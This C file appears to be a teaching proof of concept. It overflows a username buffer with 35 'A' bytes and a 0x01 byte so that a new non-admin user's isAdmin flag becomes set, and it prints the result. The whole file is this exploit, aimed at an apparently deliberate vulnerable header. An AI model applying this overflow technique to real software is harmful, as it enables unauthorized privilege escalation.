#include <stdio.h>
#include <string.h>
//#include "code_fixed.h"
#include "code.h"

int main() {
    int id = create_user_account(false, "pwned");

    printf("Before:\n");
    printf("[*] username : %s\n", username(id));
    printf("[*] isAdmin  : %d\n", is_admin(id));

    char payload[64] = {0};
    memset(payload, 'A', 35); 
    payload[35] = '\x01';      
    payload[36] = '\0';        

    update_username(id, payload);

    printf("...\nAfter:\n");
    printf("[*] username : %s\n", username(id));
    printf("[*] isAdmin  : %d\n", is_admin(id));

    return 0;
}
